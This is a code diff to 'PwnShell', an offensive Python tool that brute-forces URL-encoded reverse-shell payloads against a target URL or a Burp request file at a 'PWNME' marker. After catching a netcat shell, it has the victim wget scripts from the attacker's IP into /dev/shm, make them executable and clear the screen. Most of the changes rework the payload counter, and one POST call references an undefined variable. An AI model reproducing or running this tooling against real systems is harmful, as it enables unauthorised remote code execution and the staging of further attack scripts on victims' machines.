@@ -34,7 +34,8 @@ class PwnShell:
         self.file = args.file
         self.nodejs = args.nodejs
         self.url=None
-        self.iteration=None
+        self.iteration=0
+        self.listt=[]
 
         ########################################################################
         ###################### Specifying OS ###################################
@@ -48,6 +49,7 @@ class PwnShell:
         ######################################################################
 
     def info(self):
+    	self.payload_iter()
     	info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port,'[*]TARGET URL ': self.domain, '[*]Method': self.method.upper(), '[*]Post Data':self.data,'[*]Payload Type':self.type.upper(), '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
     	for key, value in info.items():
     		if value:
@@ -101,7 +103,7 @@ class PwnShell:
         print('[*]Activating a TTY Shell Using --> [Python3]')
         time.sleep(8)
         nc.send_line(b"export TERM=xterm-256color")
-        send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts'''
+        send = f'''wget -r -P /dev/shm http://{self.ip}:9002/scripts ; clear '''
         nc.send_line(send.encode("utf-8"))
         send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; clear ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null'''
         nc.send_line(send.encode("utf-8"))
@@ -146,17 +148,13 @@ class PwnShell:
     ############################################################################################
     ###################################  SENDING THE PAYLOADS #################################
     def send_payload(self):
-    	print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
-    	listt=[]
-    	self.iteration=0
-    	payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
-    	for payload in payloads:
-    		listt.append(payload)
     	if not self.file:
+    		payloads = PayLoads(self.ip, self.port).payloads()
+    		print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
     		for payload in payloads:
     			encoded_payload = self.get_url_encoded_payload(payload)
     			self.iteration += 1
-    			print(f'[*]Trying payload [{self.iteration}/{len(listt)}] : {encoded_payload}',end='\r',flush=True)
+    			print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {encoded_payload}',end='\r',flush=True)
     			time.sleep(2)  # Change this ASAP !!!
     			self.send_request(encoded_payload)
 
@@ -183,25 +181,32 @@ class PwnShell:
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
-        payloads = PayLoads(self.ip, self.port).payloads()
-        for payload in payloads:
-            proxies = {'http': 'http://127.0.0.1:8080'}
-            encoded_payload = self.get_url_encoded_payload(payload)
-            request, post_data = burpee.parse_request(self.file)  # Don't change
-            for r in request:
-                if request[r] == "PWNME":
-                    request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
-                if r == "Host":
-                    self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
-
-            if post_data:
-                self.url = self.url.replace("PWNME", encoded_payload)
-                post_data = post_data.replace("PWNME", encoded_payload)
-                req = requests.post(url, headers=request, data=post_data, verify=False)
-            else:
-                self.url = self.url.replace("PWNME", encoded_payload)
-                req = requests.get(self.url, headers=request,verify=False)
-                time.sleep(2)
+    	print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
+    	payloads = PayLoads(self.ip, self.port).payloads()
+    	for payload in payloads:
+        	proxies = {'http': 'http://127.0.0.1:8080'}
+        	encoded_payload = self.get_url_encoded_payload(payload)
+        	self.iteration += 1
+        	print(f'[*]Trying payload [{self.iteration}/{len(self.listt)}] : {encoded_payload}',end='\r',flush=True)
+        	request, post_data = burpee.parse_request(self.file)  # Don't change
+        	for r in request:
+        		if request[r] == "PWNME":
+        			request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
+        		if r == "Host":
+        			self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
+        	if post_data:
+        		self.url = self.url.replace("PWNME", encoded_payload)
+        		post_data = post_data.replace("PWNME", encoded_payload)
+        		req = requests.post(url, headers=request, data=post_data, verify=False)
+        	else:
+        		self.url = self.url.replace("PWNME", encoded_payload)
+        		req = requests.get(self.url, headers=request,verify=False)
+        		time.sleep(2)
+    ######################################################################################
+    def payload_iter(self):
+    	payloads = PayLoads(self.ip, self.port).payloads()
+    	for payload in payloads:
+    		self.listt.append(payload)
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
